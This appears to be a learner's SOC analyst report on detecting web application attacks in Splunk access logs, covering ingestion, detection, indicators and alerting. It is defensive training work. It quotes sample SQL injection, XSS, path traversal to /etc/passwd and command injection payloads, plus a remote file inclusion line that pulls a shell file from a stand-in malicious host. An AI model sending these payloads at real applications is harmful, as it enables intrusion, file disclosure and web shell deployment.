# Web Application Attack Detection & Threat Hunting Using Splunk
### SOC Analyst Report

**Prepared by:** Dunsin Fakorede  
**Role:** SOC Analyst / Cybersecurity Learner  
**Platform:** Splunk Enterprise 10.2.3  
**Events Analyzed:** 248,664  

---

## 1. Executive Summary

This project demonstrates the ingestion, detection, investigation, and alerting of malicious web application attack traffic using Splunk Enterprise.

The exercise simulated a real-world Security Operations Center (SOC) workflow involving:

- Log ingestion and SIEM troubleshooting
- Threat hunting and detection engineering
- Alert creation and IOC identification
- Web application attack analysis

The simulated attacks included SQL Injection (SQLi), Cross-Site Scripting (XSS), Directory Traversal / Local File Inclusion (LFI), Remote File Inclusion (RFI), Command Injection / Remote Code Execution (RCE), and reconnaissance using Nmap and sqlmap.

---

## 2. Environment Overview

| Component        | Details                           |
|------------------|-----------------------------------|
| SIEM Platform    | Splunk Enterprise 10.2.3          |
| Operating System | Windows                           |
| Data Source      | `access_log.txt`                  |
| Sourcetype       | `access_combined`                 |
| Index            | `main`                            |
| Log Type         | Web Server Access Logs            |

---

## 3. Project Objectives

- Install and configure Splunk Enterprise
- Ingest web application logs
- Validate indexing and field extraction
- Detect suspicious web attack patterns
- Create Splunk detection searches
- Perform threat hunting activities
- Create a SOC alert for malicious activity
- Develop incident findings and recommendations

---

## 4. Log Ingestion Process

The web server log file (`access_log.txt`) was ingested into Splunk. Initially, troubleshooting was required because searches returned no results. Investigation determined:

- Logs were indexed under `main`
- Sourcetype was `access_combined`
- Logs were searchable after validating the correct index

**Validation query used:**
```spl
index=* | stats count by index sourcetype source host
```

Successful validation confirmed:
- **Index:** `main`
- **Source:** `D:\Splunklogs\access_log.txt`
- **Sourcetype:** `access_combined`

---

## 5. Threat Detection Logic

See [`../queries/web_attack_detection.spl`](../queries/web_attack_detection.spl) for the full annotated query.

**Detection results:** 248,664 events matched | 24 unique `src_ip` / `attack_type` rows

---

## 6. Identified Attack Types

### 6.1 SQL Injection

**Example payload:**
```
/search?query=' OR '1'='1
```

**Indicators:** sqlmap user-agent, boolean-based injection attempts, automated scanning behavior

**Potential impact:** Database compromise, credential theft, data exfiltration

---

### 6.2 Cross-Site Scripting (XSS)

**Example payload:**
```
/profile.php?name=<script>alert('XSS')</script>
```

**Potential impact:** Session hijacking, credential theft, browser-side attacks

---

### 6.3 Directory Traversal / LFI

**Example payload:**
```
/download?file=../../../../etc/passwd
```

**Potential impact:** Sensitive file disclosure, credential exposure, server reconnaissance

---

### 6.4 Command Injection / RCE ⚠️ CRITICAL

**Example payload:**
```
/exec.php?cmd=whoami;id;ls -la
```

This is the **highest-risk finding** — the server returned HTTP status code **200**, indicating the request may have succeeded.

**Potential impact:** Remote command execution, full server compromise, malware deployment, privilege escalation

---

### 6.5 Remote File Inclusion (RFI)

**Example payload:**
```
/page.php?url=http://malicious.com/shell.txt
```

**Potential impact:** Web shell deployment, remote malware execution, persistent access

---

### 6.6 Reconnaissance & Automated Scanning

**Tools identified:** Nmap Scripting Engine, sqlmap

**Purpose:** Vulnerability discovery, automated exploitation, web application fingerprinting

---

## 7. Indicators of Compromise (IOCs)

See [`../iocs/indicators.md`](../iocs/indicators.md) for the full IOC reference.

### Suspicious IP Addresses

| IP Address        | Activity                         |
|-------------------|----------------------------------|
| `185.199.110.153` | Command Injection / RFI / LFI   |
| `37.49.226.150`   | SQL Injection / Recon            |
| `192.168.1.101`   | SQLi / XSS / LFI                 |
| `10.0.0.5`        | Internal — Command Injection     |

### Suspicious User Agents
- `sqlmap/1.4.5-dev`
- `Nmap Scripting Engine`

---

## 8. Splunk Investigation Findings

The Splunk Pattern Analysis feature successfully grouped attack activity into identifiable behavioral clusters:

- Repeated SQL injection attempts from `37.49.226.150`
- Automated scanning patterns from known tool user-agents
- XSS payload testing across profile endpoints
- Command execution attempts — **one with HTTP 200 response**
- Potential successful exploitation event (see Critical Finding below)

### Critical Finding

```
GET /exec.php?cmd=whoami;id;ls -la HTTP/1.1" 200
```

HTTP 200 status returned for a command injection payload. This indicates the application may have **accepted and executed** the command. Recommended next steps:
1. Isolate the affected host immediately
2. Capture memory dump for forensic analysis
3. Review `/exec.php` source code for input sanitisation flaws
4. Audit server-side execution logs

---

## 9. Alert Development

| Parameter     | Value                                      |
|---------------|--------------------------------------------|
| Alert Name    | Critical Web Application Attack Detection  |
| Alert Type    | Scheduled                                  |
| Schedule      | Every 1 minute                             |
| Search Window | Last 5 minutes                             |
| Trigger       | Number of Results > 0                      |
| Severity      | High / Critical                            |

---

## 10. Skills Demonstrated

| Domain                 | Specifics                                           |
|------------------------|-----------------------------------------------------|
| SIEM Operations        | Log ingestion, index validation, troubleshooting    |
| Detection Engineering  | SPL query development, regex extraction, eval logic |
| Threat Hunting         | Pattern analysis, behavioral clustering             |
| IOC Analysis           | IP attribution, user-agent fingerprinting           |
| Alert Development      | Scheduled alerts, trigger thresholds                |
| Incident Response      | RCE triage, escalation criteria                     |
| Web Attack Analysis    | SQLi, XSS, LFI, RFI, RCE, Recon                    |

---

## 11. Conclusion

This project successfully simulated a real-world SOC workflow using Splunk Enterprise to identify and investigate web application attacks across 248,664 log events. The detection logic produced 24 actionable findings, including a critical command injection event with a successful HTTP response code.

The exercise demonstrates log ingestion, threat hunting, IOC identification, alert creation, detection tuning, and incident response methodology — providing strong portfolio evidence for SOC Analyst and cybersecurity roles.

---

*Prepared by Dunsin Fakorede | May 2026*
